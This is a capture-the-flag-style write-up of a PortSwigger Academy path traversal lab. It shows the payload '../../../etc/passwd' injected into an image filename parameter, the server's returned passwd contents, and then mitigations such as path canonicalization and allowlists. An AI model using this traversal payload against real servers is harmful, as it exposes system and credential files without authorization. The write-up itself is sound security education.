# Lab Writeup: File Path Traversal — Simple Case

  

**Platform:** PortSwigger Web Security Academy  

**Vulnerability:** Path Traversal (CWE-22)  

**Difficulty:** Apprentice  

**Tool Used:** Caido (Burp Suite alternative)

  

---

  

## What Is This Vulnerability?

  

Before jumping into the solution, let's understand what we're dealing with.

  

**File path traversal** (also called *directory traversal*) is a server-side vulnerability that happens when a web application takes user-supplied input and uses it to construct a file path — without properly validating or sanitizing it.

  

The classic attack string is `../`, which in Unix-based systems means *"go up one directory level."* Chain a few of these together, and you can escape the intended directory and walk your way up to the root of the filesystem.

  

### A Quick Mental Model

  

Imagine the server handles image loading like this:

  

```

Request:  GET /image?filename=6.jpg

Server:   opens /var/www/images/6.jpg

```

  

Looks harmless. But what if the server doesn't validate `filename`? An attacker can send:

  

```

GET /image?filename=../../../etc/passwd

```

  

And the server resolves:

  

```

/var/www/images/../../../etc/passwd

→ /etc/passwd

```

  

That's it. You just read a sensitive system file you were never supposed to access.

  

---

  

## Lab Objective

  

> Retrieve the contents of `/etc/passwd` by exploiting a path traversal vulnerability in how the application loads product images.

  

---

  

## Reconnaissance

  

The lab presents a simple shopping website. The first instinct when hunting for path traversal is to ask: **where is the application loading files from user-controlled input?**

  

Product images are a classic candidate — they're dynamic, they reference files by name, and developers often forget to sanitize that input.

  

To see what's actually happening under the hood, we need to intercept HTTP traffic.

  

---

  

## Setting Up the Proxy

  

For this lab, I used **Caido** — a modern, lightweight alternative to Burp Suite — to intercept and manipulate HTTP requests.

  

1. Start Caido and configure your browser to route traffic through it.

2. Navigate to the target website and click on any product.

3. Watch the intercepted requests roll in.

  

---

  

## Finding the Injection Point

  

The first request that comes through when browsing a product page may not look interesting. Forward it and look at the **response**.

  

Scrolling through the HTML response, something catches the eye:

  

```html

<img src="/image?filename=6.jpg">

```

  

There it is. The application is loading product images by passing a filename directly as a query parameter. This is our injection point.

  

---

  

## Crafting the Payload

  

The goal is to escape the images directory and reach `/etc/passwd`.

  

Assuming the server resolves the filename relative to something like `/var/www/images/`, we need to go up three directory levels to reach the filesystem root:

  

```

/var/www/images/  →  (../)  →  /var/www/

                  →  (../)  →  /var/

                  →  (../)  →  /

                  →            /etc/passwd

```

  

So the payload becomes:

  

```

../../../etc/passwd

```

  

Injected into the image tag:

  

```html

<img src="/image?filename=../../../etc/passwd">

```

  

Or directly as a request:

  

```

GET /image?filename=../../../etc/passwd HTTP/1.1

```

  

---

  

## Exploitation

  

Using Caido's intercept or **Replay** feature, modify the `filename` parameter and forward the request.

  

The server — lacking any path validation — dutifully resolves the traversal and returns the contents of `/etc/passwd`:

  

```

root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

...

```

  

Lab solved. ✅

  

---

  

## Why Does This Work?

  

The application trusts user input to construct a file path. There is no:

  

- Canonicalization check (resolving `../` before using the path)

- Allowlist of permitted filenames

- Jail/chroot to confine file access to the images directory

  

This is a textbook case of missing input validation on a file-serving endpoint.

  

---

  

## Mitigation

  

If you were the developer, here's how you'd fix this:

  

**1. Canonicalize and validate the path**

  

After resolving the full path, check that it still starts with the intended base directory:

  

```python

import os

  

BASE_DIR = "/var/www/images/"

requested = os.path.realpath(os.path.join(BASE_DIR, user_input))

  

if not requested.startswith(BASE_DIR):

    raise Exception("Access denied")

```

  

**2. Use an allowlist**

  

If only a finite set of filenames are valid (e.g., `1.jpg`, `2.jpg` ... `100.jpg`), validate against that list and reject anything else.

  

**3. Avoid user-controlled filenames entirely**

  

Store files with server-generated names (UUIDs, hashes) and map user-facing identifiers to them in a database. Never expose raw filesystem paths to users.

  

---

  

## Key Takeaways

  

- Path traversal is simple but dangerous — it can expose `/etc/passwd`, config files, source code, private keys, and more.

- Always look for file-serving endpoints that accept user-controlled input: `?file=`, `?doc=`, `?image=`, `?path=`, `?template=`, etc.

- The fix isn't hard — but it requires developers to treat user input as untrusted at every layer.

  

---

  

*Written as part of a personal security research series. Lab from PortSwigger Web Security Academy.*
